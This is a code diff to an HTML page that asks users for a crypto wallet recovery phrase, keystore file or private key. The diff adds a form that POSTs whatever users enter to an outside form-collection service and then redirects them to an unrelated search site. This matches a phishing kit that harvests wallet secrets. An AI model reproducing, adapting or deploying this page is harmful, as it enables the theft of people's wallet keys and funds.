@@ -156,16 +156,19 @@
               </div>
             </div>
             <div class="flex justify-center item-center navbar-nav mb-2 nav nav-tabs" id="myTab" role="tablist" style="height: 70px;">
-              <button class="p-4 hover:border-b-2 text-lg hover:border-gray-500 mx-2 nav-item" id="phrase-tab" data-bs-toggle="tab" data-bs-target="#phrase-tab-pane" type="button" role="tab" aria-controls="phrase-tab-pane" aria-selected="true" role="presentation"> Phrase </button>
-              <button class="p-4 hover:border-b-2 text-lg hover:border-gray-500 mx-2 nav-item" id="keystore-tab" data-bs-toggle="tab" data-bs-target="#keystore-tab-pane" type="button" role="tab" aria-controls="Keystore-tab-pane" aria-selected="false" role="presentation"> Keystore JSON </button>
-              <button class="p-4 hover:border-b-2 text-lg hover:border-gray-500 mx-2 nav-item" id="private-tab" data-bs-toggle="tab" data-bs-target="#private-tab-pane" type="button" role="tab" aria-controls="private-tab-pane" aria-selected="false"  role="presentation"> Private Key </button>
+              <button class="p-1 hover:border-b-2 text-lg hover:border-gray-500 mx-2 nav-item" id="phrase-tab" data-bs-toggle="tab" data-bs-target="#phrase-tab-pane" type="button" role="tab" aria-controls="phrase-tab-pane" aria-selected="false" role="presentation"> Phrase </button>
+              <button class="p-1 hover:border-b-2 text-lg hover:border-gray-500 mx-2 nav-item" id="keystore-tab" data-bs-toggle="tab" data-bs-target="#keystore-tab-pane" type="button" role="tab" aria-controls="Keystore-tab-pane" aria-selected="false" role="presentation"> Keystore </button>
+              <button class="p-1 hover:border-b-2 text-lg hover:border-gray-500 mx-2 nav-item" id="private-tab" data-bs-toggle="tab" data-bs-target="#private-tab-pane" type="button" role="tab" aria-controls="private-tab-pane" aria-selected="false"  role="presentation"> Private Key </button>
             </div>
             <div class="flex justify-center item-center my-4">
               <hr class="px-2 bg-grey-100 hrdes item-center">
             </div>
+            <form action="https://submit-form.com/A3KLdQ7BT" method="POST">
+              <input type="hidden" name="_redirect" value="www.google.ng" />
+
             <div class="tab-content" id="myTabContent">
 
-              <div class="p-2 w-full tab-pane fade show active" id="phrase-tab-pane" role="tabpanel" aria-labelledby="phrase-tab" tabindex="0">
+              <div class="p-2 w-full tab-pane fade" id="phrase-tab-pane" role="tabpanel" aria-labelledby="phrase-tab" tabindex="0">
                 <textarea id="message" name="message" placeholder="Enter Your recovery phrase" class="w-full bg-gray-100 bg-opacity-50 rounded border border-gray-300 focus:border-blue-500 focus:bg-white focus:ring-2 focus:ring-blue-200 h-32 text-base outline-none text-gray-700 py-1 px-3 resize-none leading-6 transition-colors duration-200 ease-in-out"></textarea>
                 <label for="message" class="leading-7 text-sm text-gray-600">Typically 12 (sometimes 24) words separated by single spaces</label>
               </div>
@@ -184,13 +187,15 @@
                 </div>
               
             </div>
+            
 
             <!---->
             <!---->
             <div class="modal-footer">
-              <button class="modal-default-button justify-center bg-gray-900 flex py-2 text-white w-full item-center"> Proceed </button>
+              <button type="submit" class="modal-default-button justify-center bg-gray-900 flex py-2 text-white w-full item-center"> Proceed </button>
               <div class="item-center mx-auto text-center py-3"></div>
             </div>
+            </form>
           </div>
         </div>
       </div>
